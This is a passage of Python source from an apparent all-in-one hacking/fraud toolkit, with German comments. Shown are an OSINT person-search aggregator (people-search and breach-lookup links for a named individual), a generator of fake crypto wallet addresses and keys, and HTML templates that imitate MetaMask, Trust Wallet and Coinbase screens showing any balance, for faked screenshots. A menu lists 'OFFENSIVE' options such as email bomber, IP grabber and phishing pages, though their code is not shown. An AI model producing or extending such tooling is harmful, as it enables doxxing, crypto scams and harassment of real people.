# ═══════════════════════════════════════════════════════════════
def youtube_info():
    clear(); print_banner()
    print(f"{M}{B}» YouTube Video Info{RST}\n")
    url = ask("YouTube URL oder Video ID: ")
    import re as _re
    m = _re.search(r'(?:v=|youtu\.be/|shorts/|embed/)([a-zA-Z0-9_-]{11})', url)
    vid = m.group(1) if m else (url if len(url) == 11 else None)
    if not vid: log("ERR", "invalid URL", R); pause(); return
    try:
        r = requests.get(f"https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v={vid}&format=json", timeout=10).json()
        print(f"\n{C}Title:{RST}    {G}{B}{r.get('title')}{RST}")
        print(f"{C}Author:{RST}   {Y}{r.get('author_name')}{RST}")
        print(f"{C}Channel:{RST}  {G}{r.get('author_url')}{RST}")
        print(f"{C}Type:{RST}     {W}{r.get('type')}{RST}")
        print(f"{C}Video ID:{RST} {W}{vid}{RST}")
        print(f"{C}Thumbnail:{RST} {DIM}{r.get('thumbnail_url')}{RST}")
        print(f"\n{C}Download-Links (via cobalt.tools):{RST}")
        print(f"  {G}→{RST} https://cobalt.tools/#https://youtu.be/{vid}")
        print(f"  {G}→{RST} https://y2mate.com/youtube/{vid}")
        print(f"  {G}→{RST} https://ssyoutube.com/watch?v={vid}")
    except Exception as e: log("ERR", str(e), R)
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 31) WIFI QR CODE (share wifi via qr)
# ═══════════════════════════════════════════════════════════════
def wifi_qr():
    clear(); print_banner()
    print(f"{M}{B}» WiFi QR Code Generator{RST}")
    print(f"{W}   Erstellt QR code — wer scannt joined das wifi automatisch.{RST}\n")
    ssid = ask("SSID (netzwerk name): ")
    pw = ask("Passwort: ")
    auth = ask("Auth (1=WPA/WPA2  2=WEP  3=open) [1]: ","1")
    auth_str = {"1":"WPA","2":"WEP","3":"nopass"}.get(auth,"WPA")
    hidden = ask("Hidden network? (y/N): ","n").lower() == "y"
    wifi_str = f"WIFI:T:{auth_str};S:{ssid};P:{pw};H:{'true' if hidden else 'false'};;"

    try:
        import qrcode
    except ImportError:
        print(f"{Y}[*] installiere qrcode...{RST}")
        subprocess.check_call([sys.executable,"-m","pip","install","qrcode[pil]"])
        import qrcode

    qr = qrcode.QRCode(border=1)
    qr.add_data(wifi_str); qr.make()
    print(f"\n{G}QR Code:{RST}\n")
    for row in qr.get_matrix():
        line = "".join("██" if c else "  " for c in row)
        print(f"{W}{line}{RST}")

    # save PNG
    fname = os.path.join(HITS_DIR, f"wifi_qr_{ssid}.png")
    img = qrcode.make(wifi_str); img.save(fname)
    print(f"\n{G}[+] gespeichert: {Y}{fname}{RST}")
    print(f"{DIM}    → jeder der den QR scannt joined automatisch dein wifi{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 29) GERMAN ADDRESS GENERATOR (echte PLZ+Ort+Straße)
# ═══════════════════════════════════════════════════════════════
GERMAN_CITIES = [
    # (Stadt, PLZ, [echte Straßen])
    ("Berlin", "10115", ["Invalidenstraße","Chausseestraße","Torstraße","Brunnenstraße","Bergstraße"]),
    ("Berlin", "10437", ["Schönhauser Allee","Danziger Straße","Kastanienallee","Prenzlauer Allee"]),
    ("Berlin", "12043", ["Hermannstraße","Karl-Marx-Straße","Sonnenallee","Weserstraße"]),
    ("München", "80331", ["Marienplatz","Sendlinger Straße","Rindermarkt","Kaufingerstraße"]),
    ("München", "80805", ["Leopoldstraße","Ungererstraße","Feilitzschstraße","Herzogstraße"]),
    ("München", "81667", ["Rosenheimer Straße","Wörthstraße","Weißenburger Straße","Orleansstraße"]),
    ("Hamburg", "20095", ["Mönckebergstraße","Steinstraße","Spitalerstraße","Hermannstraße"]),
    ("Hamburg", "22765", ["Bahrenfelder Straße","Ottenser Hauptstraße","Große Bergstraße","Nöltingstraße"]),
    ("Hamburg", "20359", ["Reeperbahn","Große Freiheit","Simon-von-Utrecht-Straße","Talstraße"]),
    ("Köln", "50667", ["Hohe Straße","Schildergasse","Ehrenstraße","Breite Straße"]),
    ("Köln", "50823", ["Venloer Straße","Aachener Straße","Ehrenfeldgürtel","Piusstraße"]),
    ("Köln", "51103", ["Kalker Hauptstraße","Deutzer Freiheit","Bergisch-Gladbacher Straße"]),
    ("Frankfurt am Main", "60311", ["Zeil","Kaiserstraße","Schillerstraße","Roßmarkt"]),
    ("Frankfurt am Main", "60594", ["Textorstraße","Diesterwegstraße","Brückenstraße","Schweizer Straße"]),
    ("Stuttgart", "70173", ["Königstraße","Schlossplatz","Kirchstraße","Marktstraße"]),
    ("Stuttgart", "70376", ["Bad Cannstatter Straße","Nürnberger Straße","Elbestraße","Waiblinger Straße"]),
    ("Düsseldorf", "40213", ["Königsallee","Schadowstraße","Berliner Allee","Immermannstraße"]),
    ("Düsseldorf", "40233", ["Nordstraße","Duisburger Straße","Kaiserswerther Straße"]),
    ("Leipzig", "04109", ["Karl-Liebknecht-Straße","Ritterstraße","Nikolaistraße","Petersstraße"]),
    ("Leipzig", "04275", ["Karl-Heine-Straße","Merseburger Straße","Zschochersche Straße"]),
    ("Dresden", "01067", ["Prager Straße","Wilsdruffer Straße","Wallstraße","Ammonstraße"]),
    ("Dresden", "01099", ["Bautzner Straße","Görlitzer Straße","Königsbrücker Straße","Alaunstraße"]),
    ("Hannover", "30159", ["Bahnhofstraße","Georgstraße","Karmarschstraße","Osterstraße"]),
    ("Hannover", "30167", ["Podbielskistraße","Sallstraße","Nordstadtplatz","Engelbosteler Damm"]),
    ("Nürnberg", "90402", ["Königstraße","Karolinenstraße","Kaiserstraße","Ludwigsplatz"]),
    ("Nürnberg", "90439", ["Fürther Straße","Rothenburger Straße","Schwabacher Straße"]),
    ("Bremen", "28195", ["Sögestraße","Obernstraße","Böttcherstraße","Am Wall"]),
    ("Bremen", "28203", ["Osterdeich","Vor dem Steintor","Ostertorsteinweg","Sielwall"]),
    ("Essen", "45127", ["Kettwiger Straße","Limbecker Straße","Viehofer Straße","Rüttenscheider Straße"]),
    ("Dortmund", "44135", ["Westenhellweg","Ostenhellweg","Kampstraße","Hansastraße"]),
    ("Bonn", "53111", ["Sternstraße","Poststraße","Remigiusstraße","Am Hof"]),
    ("Karlsruhe", "76133", ["Kaiserstraße","Erbprinzenstraße","Waldstraße","Herrenstraße"]),
    ("Mannheim", "68159", ["Planken","Kurpfalzstraße","Kunststraße","Fressgasse"]),
    ("Augsburg", "86150", ["Maximilianstraße","Karolinenstraße","Bahnhofstraße","Fuggerstraße"]),
    ("Wiesbaden", "65183", ["Wilhelmstraße","Taunusstraße","Bahnhofstraße","Marktstraße"]),
    ("Kiel", "24103", ["Holstenstraße","Sophienblatt","Alter Markt","Dänische Straße"]),
    ("Freiburg im Breisgau", "79098", ["Kaiser-Joseph-Straße","Bertoldstraße","Rathausgasse","Konviktstraße"]),
    ("Mainz", "55116", ["Ludwigsstraße","Große Bleiche","Schillerstraße","Am Brand"]),
    ("Erfurt", "99084", ["Anger","Bahnhofstraße","Löberstraße","Predigerstraße"]),
    ("Rostock", "18055", ["Kröpeliner Straße","Lange Straße","Neuer Markt","Universitätsplatz"]),
    ("Münster", "48143", ["Prinzipalmarkt","Salzstraße","Ludgeristraße","Rothenburg"]),
    ("Wuppertal", "42103", ["Neumarkt","Alte Freiheit","Poststraße","Herzogstraße"]),
    ("Bielefeld", "33602", ["Bahnhofstraße","Niederwall","Obernstraße","Jahnplatz"]),
    ("Duisburg", "47051", ["Königstraße","Sonnenwall","Kuhstraße","Universitätsstraße"]),
    ("Bochum", "44787", ["Kortumstraße","Huestraße","Brückstraße","Massenbergstraße"]),
    ("Chemnitz", "09111", ["Straße der Nationen","Bahnhofstraße","Innere Klosterstraße","Neumarkt"]),
    ("Halle (Saale)", "06108", ["Leipziger Straße","Große Ulrichstraße","Klement-Gottwald-Straße","Marktplatz"]),
    ("Magdeburg", "39104", ["Breiter Weg","Ernst-Reuter-Allee","Otto-von-Guericke-Straße","Hasselbachplatz"]),
    ("Braunschweig", "38100", ["Damm","Bohlweg","Steinweg","Sack"]),
    ("Aachen", "52062", ["Adalbertstraße","Pontstraße","Ursulinerstraße","Buchkremerstraße"]),
    ("Kassel", "34117", ["Obere Königsstraße","Untere Königsstraße","Friedrichstraße","Bahnhofstraße"]),
]

def german_address():
    clear(); print_banner()
    print(f"{W}{B}» German Address Generator{RST}")
    print(f"{DIM}   Echte deutsche adressen — PLZ, Ort & Straße passen zusammen{RST}\n")
    count = int(ask("Anzahl adressen [1]: ","1"))
    for i in range(count):
        stadt, plz, strassen = random.choice(GERMAN_CITIES)
        strasse = random.choice(strassen)
        hausnr = str(random.randint(1, 180))
        # ~15% chance auf a/b/c suffix
        if random.random() < 0.15:
            hausnr += random.choice(["a","b","c"])
        print(f"\n{G}{B}╔═══ Adresse #{i+1} ═════════════════════╗{RST}")
        print(f"  {C}Straße:{RST}      {W}{strasse} {hausnr}{RST}")
        print(f"  {C}PLZ:{RST}         {W}{plz}{RST}")
        print(f"  {C}Ort:{RST}         {W}{stadt}{RST}")
        print(f"  {C}Land:{RST}        {W}Deutschland{RST}")
        print(f"{G}{B}╚═══════════════════════════════════════╝{RST}")
        save_hit("german_addresses", f"{strasse} {hausnr}, {plz} {stadt}")
    print(f"\n{DIM}   → gespeichert in hits/german_addresses.txt{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 28) COMPLETE PERSON SEARCH — OSINT alles über ne person
# ═══════════════════════════════════════════════════════════════
def person_search():
    clear(); print_banner()
    print(f"{W}{B}» Complete Person Search{RST}")
    print(f"{DIM}   Alles was das internet über ne person findet.{RST}\n")

    name = ask("Full Name: ")
    city = ask("City (optional): ", "")
    email = ask("Email (optional): ", "")
    if not name: return

    print(f"\n{G}[+] Searching for {W}{B}{name}{RST}{G}...{RST}\n")

    import urllib.parse as up
    q = up.quote(name)
    q_full = up.quote(f'{name} {city}'.strip())

    print(f"{W}{B}═══ SOCIAL MEDIA ══════════════════════════════{RST}")
    socials = {
        "Facebook":  f"https://www.facebook.com/public/{q}",
        "LinkedIn":  f"https://www.linkedin.com/pub/dir?firstAndLast={q}",
        "Twitter/X": f"https://twitter.com/search?q={q}&f=user",
        "Instagram": f"https://www.instagram.com/{name.lower().replace(' ','')}/",
        "TikTok":    f"https://www.tiktok.com/@{name.lower().replace(' ','')}",
        "YouTube":   f"https://www.youtube.com/results?search_query={q}",
        "Pinterest": f"https://www.pinterest.com/search/pins/?q={q}",
        "Reddit":    f"https://www.reddit.com/search/?q={q}&type=user",
    }
    for site, url in socials.items():
        print(f"  {G}•{RST} {C}{site:<12}{RST} {url}")

    print(f"\n{W}{B}═══ PEOPLE SEARCH ENGINES ═════════════════════{RST}")
    people = {
        "TruePeopleSearch": f"https://www.truepeoplesearch.com/results?name={q}",
        "FastPeopleSearch": f"https://www.fastpeoplesearch.com/name/{name.replace(' ','-').lower()}",
        "Whitepages":       f"https://www.whitepages.com/name/{name.replace(' ','-')}",
        "Spokeo":           f"https://www.spokeo.com/{name.replace(' ','-')}",
        "BeenVerified":     f"https://www.beenverified.com/people/{name.replace(' ','-').lower()}/",
        "PeekYou":          f"https://www.peekyou.com/{name.lower().replace(' ','_')}",
        "Pipl":             f"https://pipl.com/search/?q={q_full}",
        "ThatsThem":        f"https://thatsthem.com/name/{name.replace(' ','-')}",
        "Radaris":          f"https://radaris.com/p/{name.replace(' ','/')}",
        "411.com":          f"https://www.411.com/name/{name.replace(' ','-')}",
    }
    for site, url in people.items():
        print(f"  {G}•{RST} {C}{site:<20}{RST} {url}")

    print(f"\n{W}{B}═══ SEARCH ENGINES ════════════════════════════{RST}")
    searches = {
        "Google Web":     f'https://google.com/search?q="{q_full}"',
        "Google Images":  f'https://google.com/search?tbm=isch&q="{q}"',
        "DuckDuckGo":     f'https://duckduckgo.com/?q="{q_full}"',
        "Bing":           f'https://www.bing.com/search?q="{q_full}"',
        "Yandex":         f'https://yandex.com/search/?text="{q}"',
    }
    for site, url in searches.items():
        print(f"  {G}•{RST} {C}{site:<16}{RST} {url}")

    if email:
        print(f"\n{W}{B}═══ EMAIL INTEL ═══════════════════════════════{RST}")
        eq = up.quote(email)
        emails = {
            "HaveIBeenPwned":  f"https://haveibeenpwned.com/account/{eq}",
            "XposedOrNot":     f"https://xposedornot.com/email/{eq}",
            "Hunter.io":       f"https://hunter.io/search/{eq.split('@')[-1] if '@' in email else email}",
            "EmailRep":        f"https://emailrep.io/{eq}",
            "Gravatar":        f"https://gravatar.com/{__import__('hashlib').md5(email.strip().lower().encode()).hexdigest()}",
        }
        for site, url in emails.items():
            print(f"  {G}•{RST} {C}{site:<16}{RST} {url}")

    print(f"\n{W}{B}═══ USERNAME OSINT ═══════════════════════════{RST}")
    print(f"  {G}→{RST} Nutze Menü {C}12{RST} für automated username-check across 18 sites")

    # optional: browser öffnen für top hits
    if ask(f"\n{Y}Top-hits automatisch im browser öffnen? (y/N): {RST}","n").lower() == "y":
        import webbrowser
        for url in list(socials.values())[:3] + list(people.values())[:3] + list(searches.values())[:2]:
            webbrowser.open(url); time.sleep(0.4)
        print(f"{G}[+] tabs geöffnet{RST}")

    save_hit("person_searches", f"{name} | {city} | {email}")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 29) CRYPTO WALLET GENERATOR (BTC/ETH/SOL/LTC)
# ═══════════════════════════════════════════════════════════════
def crypto_wallets():
    clear(); print_banner()
    print(f"{W}{B}» Crypto Wallet Generator{RST}")
    print(f"{DIM}   Fake wallet addressen + mobile app screenshots{RST}\n")

    print(f"  {C}1{RST}) Bitcoin (BTC)")
    print(f"  {C}2{RST}) Ethereum (ETH)")
    print(f"  {C}3{RST}) Solana (SOL)")
    print(f"  {C}4{RST}) Litecoin (LTC)")
    print(f"  {C}5{RST}) Dogecoin (DOGE)")
    print(f"  {C}6{RST}) Alle typen")
    print(f"  {C}7{RST}) {G}Mobile Wallet Screenshot (MetaMask/Trust Wallet style){RST}")

    choice = ask("\nWahl: ")
    count = int(ask("Anzahl [5]: ","5"))

    import hashlib
    def rand_hex(n): return "".join(random.choice("0123456789abcdef") for _ in range(n))
    def rand_b58(n):
        chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        return "".join(random.choice(chars) for _ in range(n))

    def gen_btc():
        # bitcoin legacy address (P2PKH) starts with 1 or bc1 for bech32
        style = random.choice(["legacy","segwit","bech32"])
        if style == "legacy": return "1" + rand_b58(random.randint(25,33))
        elif style == "segwit": return "3" + rand_b58(random.randint(25,33))
        else: return "bc1q" + "".join(random.choice("023456789acdefghjklmnpqrstuvwxyz") for _ in range(38))

    def gen_eth(): return "0x" + rand_hex(40)
    def gen_sol(): return rand_b58(random.randint(43,44))
    def gen_ltc(): return "L" + rand_b58(random.randint(25,33))
    def gen_doge(): return "D" + rand_b58(random.randint(25,33))

    gens = {"1":("BTC",gen_btc),"2":("ETH",gen_eth),"3":("SOL",gen_sol),
            "4":("LTC",gen_ltc),"5":("DOGE",gen_doge)}

    def show(name, addr, i):
        seed = rand_hex(64)
        priv = rand_hex(64)
        balance = round(random.uniform(0.001, 5.5), 8) if random.random() < 0.4 else 0.0
        print(f"\n{G}{B}╔═══ {name} Wallet #{i+1} ══════════════════════╗{RST}")
        print(f"  {C}Address:{RST}     {Y}{B}{addr}{RST}")
        print(f"  {C}Private key:{RST} {DIM}{priv}{RST}")
        print(f"  {C}Seed (hex):{RST}  {DIM}{seed}{RST}")
        print(f"  {C}Fake balance:{RST} {G if balance else DIM}{balance} {name}{RST}")
        print(f"{G}{B}╚═════════════════════════════════════════════╝{RST}")
        save_hit(f"crypto_{name.lower()}", f"{addr} | {priv}")

    if choice == "7":
        # Mobile wallet screenshot
        print(f"\n{C}Mobile Wallet Style:{RST}")
        print(f"  {C}1{RST}) MetaMask")
        print(f"  {C}2{RST}) Trust Wallet")
        print(f"  {C}3{RST}) Coinbase Wallet")
        wchoice = ask("\nWahl: ")
        balance = float(ask("Balance zeigen (ETH/BTC amount) [2.4567]: ","2.4567"))
        usd_val = int(balance * random.uniform(2500,4000)) if wchoice in ("1","3") else int(balance * 65000)
        addr = gen_eth() if wchoice in ("1","3") else gen_btc()

        if wchoice == "1":  # MetaMask
            html = _wallet_metamask(addr, balance, usd_val)
        elif wchoice == "2":  # Trust
            html = _wallet_trust(addr, balance, usd_val)
        else:  # Coinbase
            html = _wallet_coinbase(addr, balance, usd_val)

        fname = os.path.join(HITS_DIR, f"wallet_screenshot_{int(time.time())}.html")
        with open(fname, "w", encoding="utf-8") as f: f.write(html)
        print(f"\n{G}{B}[+] Wallet screenshot HTML:{RST} {Y}{fname}{RST}")
        print(f"{DIM}   → Öffne im browser → F12 → device toolbar (iPhone) → screenshot{RST}")
        if ask("\nJetzt öffnen? (Y/n): ","y").lower() != "n":
            try: os.startfile(fname)
            except: pass
        pause(); return

    if choice == "6":
        for i in range(count):
            for name, gen in gens.values():
                show(name, gen(), i)
    elif choice in gens:
        name, gen = gens[choice]
        for i in range(count):
            show(name, gen(), i)

    print(f"\n{DIM}  → gespeichert in hits/crypto_*.txt{RST}")
    print(f"{Y}[!] Diese wallets sind FAKE — nur für tests/screenshots.{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# Mobile wallet screenshot templates
# ═══════════════════════════════════════════════════════════════
_PHONE_WRAP_CSS = """
body{margin:0;background:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',sans-serif}
.phone{width:390px;min-height:844px;background:#fff;border-radius:52px;overflow:hidden;box-shadow:0 40px 100px rgba(0,0,0,.6);position:relative;border:12px solid #000}
.notch{position:absolute;top:0;left:50%;transform:translateX(-50%);width:120px;height:32px;background:#000;border-radius:0 0 20px 20px;z-index:100}
.statusbar{display:flex;justify-content:space-between;align-items:center;padding:14px 30px 6px;font-size:15px;font-weight:600}
"""

def _wallet_metamask(addr, balance, usd):
    short = addr[:6] + "..." + addr[-4:]
    return f"""<!doctype html><html><head><meta charset="utf-8"><title>MetaMask</title>
<style>{_PHONE_WRAP_CSS}
.phone{{background:#141618;color:#fff}}
.statusbar{{color:#fff}}
.header{{padding:12px 20px;display:flex;align-items:center;justify-content:space-between}}
.hamb{{font-size:24px}}
.acc{{display:flex;align-items:center;gap:8px;background:#24262b;padding:6px 14px;border-radius:20px;font-size:14px}}
.acc-dot{{width:24px;height:24px;background:linear-gradient(135deg,#f6851b,#ffcc80);border-radius:50%}}
.settings{{font-size:20px}}
.balance-area{{text-align:center;padding:40px 20px 30px}}
.eye{{color:#8a8a8f;font-size:20px;margin-bottom:12px}}
.balance{{font-size:48px;font-weight:600;margin:8px 0}}
.balance .cents{{color:#8a8a8f;font-size:32px}}
.change{{color:#28a745;font-size:15px;font-weight:500;margin-top:4px}}
.actions{{display:flex;justify-content:space-around;padding:20px 24px 30px}}
.action{{text-align:center}}
.action-btn{{width:48px;height:48px;background:#f6851b;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;margin:0 auto 8px}}
.action-lbl{{font-size:12px;color:#8a8a8f}}
.tabs{{display:flex;padding:0 20px;border-bottom:1px solid #24262b}}
.tab{{flex:1;text-align:center;padding:14px 0;font-size:15px;color:#8a8a8f;font-weight:600}}
.tab.active{{color:#fff;border-bottom:2px solid #f6851b}}
.token{{display:flex;align-items:center;padding:16px 20px;border-bottom:1px solid #24262b}}
.token-icon{{width:40px;height:40px;background:linear-gradient(135deg,#627eea,#8b9dea);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;margin-right:14px;flex-shrink:0}}
.token-info{{flex:1}}
.token-name{{font-weight:600;font-size:15px}}
.token-amt{{color:#8a8a8f;font-size:13px;margin-top:2px}}
.token-val{{text-align:right}}
.token-val .fiat{{font-weight:600;font-size:15px}}
.token-val .pct{{color:#28a745;font-size:13px;margin-top:2px}}
</style></head><body><div class="phone">
<div class="notch"></div>
<div class="statusbar"><span>9:41</span><span>●●●●● 5G 100</span></div>
<div class="header"><span class="hamb">☰</span><div class="acc"><div class="acc-dot"></div>Account 1 · {short}</div><span class="settings">⚙</span></div>
<div class="balance-area">
<div class="eye">👁 Show balance</div>
<div class="balance">${usd:,}<span class="cents">.{random.randint(10,99)}</span></div>
<div class="change">+ $124.32 (+2.4%)</div>
</div>
<div class="actions">
<div class="action"><div class="action-btn">↑</div><div class="action-lbl">Send</div></div>
<div class="action"><div class="action-btn">↓</div><div class="action-lbl">Receive</div></div>
<div class="action"><div class="action-btn">↔</div><div class="action-lbl">Swap</div></div>
<div class="action"><div class="action-btn">$</div><div class="action-lbl">Buy</div></div>
</div>
<div class="tabs"><div class="tab active">Tokens</div><div class="tab">NFTs</div><div class="tab">Activity</div></div>
<div class="token"><div class="token-icon">Ξ</div><div class="token-info"><div class="token-name">Ethereum</div><div class="token-amt">{balance} ETH</div></div><div class="token-val"><div class="fiat">${usd:,}</div><div class="pct">+2.4%</div></div></div>
<div class="token"><div class="token-icon" style="background:#26a17b">$</div><div class="token-info"><div class="token-name">USDT</div><div class="token-amt">{random.randint(500,3000)} USDT</div></div><div class="token-val"><div class="fiat">${random.randint(500,3000):,}</div><div class="pct">+0.1%</div></div></div>
<div class="token"><div class="token-icon" style="background:#f7931a">₿</div><div class="token-info"><div class="token-name">Bitcoin</div><div class="token-amt">{round(random.uniform(0.01,0.5),4)} BTC</div></div><div class="token-val"><div class="fiat">${random.randint(2000,15000):,}</div><div class="pct">+3.1%</div></div></div>
</div></body></html>"""

def _wallet_trust(addr, balance, usd):
    short = addr[:6] + "..." + addr[-4:]
    return f"""<!doctype html><html><head><meta charset="utf-8"><title>Trust Wallet</title>
<style>{_PHONE_WRAP_CSS}
.phone{{background:#0b0e11;color:#fff}}
.statusbar{{color:#fff}}
.header{{padding:14px 20px;display:flex;align-items:center;justify-content:space-between}}
.qr{{font-size:22px}}
.acc-name{{font-size:16px;font-weight:600}}
.scan{{font-size:22px}}
.balance-area{{text-align:center;padding:32px 20px 24px}}
.balance{{font-size:44px;font-weight:700;letter-spacing:-1px}}
.change{{color:#20c274;font-size:14px;font-weight:500;margin-top:8px}}
.actions{{display:flex;justify-content:space-around;padding:24px 20px 30px;border-bottom:1px solid #1c2028}}
.action{{text-align:center}}
.action-btn{{width:52px;height:52px;background:#1c2028;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#3375bb;font-size:22px;margin:0 auto 8px}}
.action-lbl{{font-size:13px;color:#fff;font-weight:500}}
.section-hdr{{padding:20px 20px 12px;color:#7d879c;font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}}
.token{{display:flex;align-items:center;padding:14px 20px}}
.token-icon{{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;margin-right:14px;flex-shrink:0}}
.token-info{{flex:1}}
.token-name{{font-weight:600;font-size:15px}}
.token-price{{color:#7d879c;font-size:12px;margin-top:2px}}
.token-price .up{{color:#20c274}}
.token-val{{text-align:right}}
.token-val .amt{{font-weight:600;font-size:15px}}
.token-val .fiat{{color:#7d879c;font-size:12px;margin-top:2px}}
</style></head><body><div class="phone">
<div class="notch"></div>
<div class="statusbar"><span>9:41</span><span>●●●●● 5G 100</span></div>
<div class="header"><span class="qr">⧉</span><span class="acc-name">Main Wallet ▾</span><span class="scan">⚙</span></div>
<div class="balance-area">
<div class="balance">${usd:,}.{random.randint(10,99)}</div>
<div class="change">↗ +$284.14 (+3.2%)</div>
</div>
<div class="actions">
<div class="action"><div class="action-btn">↑</div><div class="action-lbl">Send</div></div>
<div class="action"><div class="action-btn">↓</div><div class="action-lbl">Receive</div></div>
<div class="action"><div class="action-btn">$</div><div class="action-lbl">Buy</div></div>
<div class="action"><div class="action-btn">↔</div><div class="action-lbl">Swap</div></div>
<div class="action"><div class="action-btn">%</div><div class="action-lbl">Earn</div></div>
</div>
<div class="section-hdr">Crypto</div>
<div class="token"><div class="token-icon" style="background:#627eea">Ξ</div><div class="token-info"><div class="token-name">Ethereum</div><div class="token-price">$3,245 <span class="up">+2.4%</span></div></div><div class="token-val"><div class="amt">{balance} ETH</div><div class="fiat">${usd:,}</div></div></div>
<div class="token"><div class="token-icon" style="background:#f7931a">₿</div><div class="token-info"><div class="token-name">Bitcoin</div><div class="token-price">$65,120 <span class="up">+1.8%</span></div></div><div class="token-val"><div class="amt">{round(random.uniform(0.1,1),4)} BTC</div><div class="fiat">${random.randint(3000,25000):,}</div></div></div>
<div class="token"><div class="token-icon" style="background:#000">Ⓞ</div><div class="token-info"><div class="token-name">Solana</div><div class="token-price">$142 <span class="up">+5.3%</span></div></div><div class="token-val"><div class="amt">{round(random.uniform(1,50),2)} SOL</div><div class="fiat">${random.randint(200,4000):,}</div></div></div>
<div class="token"><div class="token-icon" style="background:#26a17b">$</div><div class="token-info"><div class="token-name">USDT</div><div class="token-price">$1.00 <span class="up">+0.0%</span></div></div><div class="token-val"><div class="amt">{random.randint(500,3000)} USDT</div><div class="fiat">${random.randint(500,3000):,}</div></div></div>
</div></body></html>"""

def _wallet_coinbase(addr, balance, usd):
    short = addr[:6] + "..." + addr[-4:]
    return f"""<!doctype html><html><head><meta charset="utf-8"><title>Coinbase Wallet</title>
<style>{_PHONE_WRAP_CSS}
.phone{{background:#fff;color:#0a0b0d}}
.statusbar{{color:#0a0b0d}}
.header{{padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}}
.acc{{display:flex;align-items:center;gap:10px;font-weight:600;font-size:15px}}
.acc-dot{{width:32px;height:32px;background:#0052ff;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700}}
.balance-area{{text-align:center;padding:36px 20px 24px}}
.balance-lbl{{color:#5b616e;font-size:14px;font-weight:500;margin-bottom:12px}}
.balance{{font-size:48px;font-weight:700;color:#0a0b0d;letter-spacing:-1.5px}}
.change{{color:#05b169;font-size:15px;font-weight:600;margin-top:10px;display:inline-flex;align-items:center;gap:6px}}
.actions{{display:flex;justify-content:space-between;padding:24px 20px 20px}}
.action{{flex:1;text-align:center}}
.action-btn{{background:#f5f6f8;color:#0052ff;padding:14px 0;border-radius:12px;font-weight:600;font-size:14px;margin:0 6px}}
.section-hdr{{padding:24px 20px 12px;font-size:17px;font-weight:700}}
.token{{display:flex;align-items:center;padding:14px 20px}}
.token-icon{{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;margin-right:14px;flex-shrink:0;font-size:20px}}
.token-info{{flex:1}}
.token-name{{font-weight:600;font-size:16px;color:#0a0b0d}}
.token-price{{color:#5b616e;font-size:13px;margin-top:2px}}
.token-val{{text-align:right}}
.token-val .fiat{{font-weight:600;font-size:15px;color:#0a0b0d}}
.token-val .pct{{color:#05b169;font-size:13px;margin-top:2px;font-weight:500}}
</style></head><body><div class="phone">
<div class="notch"></div>
<div class="statusbar"><span>9:41</span><span>●●●●● 5G 100</span></div>
<div class="header"><div class="acc"><div class="acc-dot">M</div>Main</div><span style="font-size:20px">🔍</span></div>
<div class="balance-area">
<div class="balance-lbl">Wallet balance</div>
<div class="balance">${usd:,}.{random.randint(10,99)}</div>
<div class="change">↗ $340.10 (+2.8%) Today</div>
</div>
<div class="actions">
<div class="action"><div class="action-btn">Send</div></div>
<div class="action"><div class="action-btn">Receive</div></div>
<div class="action"><div class="action-btn">Swap</div></div>
</div>
<div class="section-hdr">Assets</div>
<div class="token"><div class="token-icon" style="background:#627eea">Ξ</div><div class="token-info"><div class="token-name">Ethereum</div><div class="token-price">{balance} ETH</div></div><div class="token-val"><div class="fiat">${usd:,}</div><div class="pct">+2.4%</div></div></div>
<div class="token"><div class="token-icon" style="background:#f7931a">₿</div><div class="token-info"><div class="token-name">Bitcoin</div><div class="token-price">{round(random.uniform(0.05,0.8),4)} BTC</div></div><div class="token-val"><div class="fiat">${random.randint(3000,50000):,}</div><div class="pct">+1.8%</div></div></div>
<div class="token"><div class="token-icon" style="background:#26a17b">$</div><div class="token-info"><div class="token-name">USD Coin</div><div class="token-price">{random.randint(1000,5000)} USDC</div></div><div class="token-val"><div class="fiat">${random.randint(1000,5000):,}</div><div class="pct" style="color:#5b616e">0.0%</div></div></div>
</div></body></html>"""

# ═══════════════════════════════════════════════════════════════
# MENU HELPERS
# ═══════════════════════════════════════════════════════════════
def menu_choice():
    if HAS_MSVCRT:
        buf = ""
        while True:
            ch = msvcrt.getwch()
            if ch == "\x1b": return "0"
            if ch in ("\r","\n"): print(); return buf
            if ch == "\x08":
                if buf: buf = buf[:-1]; print("\b \b", end="", flush=True)
                continue
            if ch == "\x03": raise KeyboardInterrupt
            buf += ch; print(ch, end="", flush=True)
    return input().strip()

def menu():
    while True:
        clear(); print_banner()
        print(f"{W}  ┌─────────────────────────────────────────────────┐{RST}")
        # DISCORD
        print(f"{W}  │{RST} {W}{B}DISCORD{RST}")
        print(f"{W}  │{RST}   {C} 1){RST} {W}Join LO's Discord Server{RST}")
        print(f"{W}  │{RST}   {C} 2){RST} {W}Username Sniper{RST}")
        print(f"{W}  │{RST}   {C} 3){RST} {W}Invite Info{RST}")
        print(f"{W}  │{RST}   {C} 4){RST} {W}Nitro Code Gen{RST}")
        print(f"{W}  │{RST}   {C} 5){RST} {W}Token Checker{RST}")
        print(f"{W}  ├─────────────────────────────────────────────────┤{RST}")
        # OFFENSIVE
        print(f"{W}  │{RST} {W}{B}OFFENSIVE{RST}")
        print(f"{W}  │{RST}   {C} 6){RST} {W}Email Bomber{RST}")
        print(f"{W}  │{RST}   {C} 7){RST} {W}IP Grabber{RST}")
        print(f"{W}  │{RST}   {C} 8){RST} {W}Phishing Pages{RST}")
        print(f"{W}  ├─────────────────────────────────────────────────┤{RST}")
        # OSINT
